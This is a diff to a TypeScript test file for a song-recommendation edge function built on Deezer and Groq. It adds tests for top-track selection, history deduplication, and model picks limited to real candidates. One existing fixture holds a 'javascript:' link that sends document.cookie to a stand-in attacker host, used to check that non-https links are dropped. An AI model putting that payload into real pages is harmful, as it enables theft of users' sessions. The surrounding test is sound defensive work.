@@ -247,7 +247,7 @@ const deezerTrack = (extra: Record<string, unknown> = {}) => ({
 });
 
 it("spotify-songs drops a non-https link Deezer hands back", async () => {
-  vi.spyOn(globalThis, "fetch").mockResolvedValue(
+  vi.spyOn(globalThis, "fetch").mockImplementation(async () =>
     deezerReply([deezerTrack({ link: "javascript:fetch('https://attacker.test?c='+document.cookie)" })]),
   );
   const handler = loadEdgeFunction("spotify-songs", consentingClient());
@@ -264,7 +264,7 @@ it("spotify-songs drops a non-https link Deezer hands back", async () => {
 });
 
 it("spotify-songs keeps a genuine https link and drops non-https media", async () => {
-  vi.spyOn(globalThis, "fetch").mockResolvedValue(
+  vi.spyOn(globalThis, "fetch").mockImplementation(async () =>
     deezerReply([
       deezerTrack({
         link: "https://www.deezer.com/track/12345",
@@ -286,4 +286,70 @@ it("spotify-songs keeps a genuine https link and drops non-https media", async (
   // Plain http is not https: dropped rather than downgraded silently.
   expect(pick.previewUrl).toBeNull();
   expect(pick.albumArt).toBe("https://e-cdns-images.dzcdn.net/big.jpg");
+});
+
+/** A consenting client whose past entries already hold the given song ids. */
+const clientWithHistory = (servedIds: string[]) => consentingClient({
+  from: (table: string) => table === "entries"
+    ? { select: () => ({ eq: () => ({ order: () => ({ limit: async () => ({ data: [{ songs: { picks: servedIds.map((id) => ({ id })) } }], error: null }) }) }) }) }
+    : { select: () => ({ eq: () => ({ maybeSingle: async () => ({ data: CONSENTING_PROFILE, error: null }) }) }) },
+});
+
+/** Deezer as it answers: an artist lookup, that artist's top tracks, genre searches. */
+const fakeDeezer = (topTracks: ReturnType<typeof deezerTrack>[]) =>
+  vi.spyOn(globalThis, "fetch").mockImplementation(async (input) => {
+    const url = String(input);
+    if (url.startsWith("https://api.groq.com")) return new Response("{}", { status: 503 });
+    if (url.includes("/search/artist")) return deezerReply([{ id: 777, name: "Olivia Rodrigo" }]);
+    if (url.includes("/artist/777/top")) return deezerReply(topTracks);
+    return deezerReply([]);
+  });
+
+const oliviaTop = Array.from({ length: 20 }, (_, i) =>
+  deezerTrack({ id: 1000 + i, title: `Song ${i}`, artist: { name: "Olivia Rodrigo" } }));
+
+it("spotify-songs draws from the listed artist's top tracks, not one search hit", async () => {
+  const request = fakeDeezer(oliviaTop);
+  const handler = loadEdgeFunction("spotify-songs", consentingClient());
+
+  const response = await handler(post({ mood: 3, energy: 3, artists: ["Olivia Rodrigo"], seed: 5 }));
+  const body = (await response.json()) as { picks: { artist: string }[] };
+
+  expect(request.mock.calls.some(([url]) => String(url).includes("/artist/777/top"))).toBe(true);
+  expect(body.picks.length).toBe(3);
+  expect(body.picks.every((p) => p.artist === "Olivia Rodrigo")).toBe(true);
+});
+
+it("spotify-songs skips songs this person was already given", async () => {
+  fakeDeezer(oliviaTop);
+  const served = oliviaTop.slice(0, 17).map((t) => String(t.id));
+  const handler = loadEdgeFunction("spotify-songs", clientWithHistory(served));
+
+  const response = await handler(post({ mood: 3, energy: 3, artists: ["Olivia Rodrigo"], seed: 1 }));
+  const body = (await response.json()) as { picks: { id: string }[] };
+
+  expect(body.picks.map((p) => p.id).sort()).toEqual(["1017", "1018", "1019"]);
+});
+
+it("spotify-songs lets the model choose for the entry, from real candidates only", async () => {
+  const request = vi.spyOn(globalThis, "fetch").mockImplementation(async (input, init) => {
+    const url = String(input);
+    if (url.startsWith("https://api.groq.com")) {
+      const prompt = JSON.parse(String(init?.body)).messages[1].content as string;
+      expect(prompt).toContain("Feelings: anxious");
+      return groqReply({ picks: [{ i: 2, why: "Soft, for an anxious night" }, { i: 99, why: "made up" }] });
+    }
+    if (url.includes("/search/artist")) return deezerReply([{ id: 777 }]);
+    if (url.includes("/artist/777/top")) return deezerReply(oliviaTop);
+    return deezerReply([]);
+  });
+  const handler = loadEdgeFunction("spotify-songs", consentingClient());
+
+  const response = await handler(post({ mood: 2, energy: 2, feelings: ["anxious"], artists: ["Olivia Rodrigo"], seed: 3 }));
+  const body = (await response.json()) as { picks: { reason: string }[] };
+
+  expect(request.mock.calls.some(([url]) => String(url).startsWith("https://api.groq.com"))).toBe(true);
+  expect(body.picks.length).toBe(3);
+  expect(body.picks[0].reason).toBe("Soft, for an anxious night");
+  expect(body.picks.some((p) => p.reason === "made up")).toBe(false);
 });
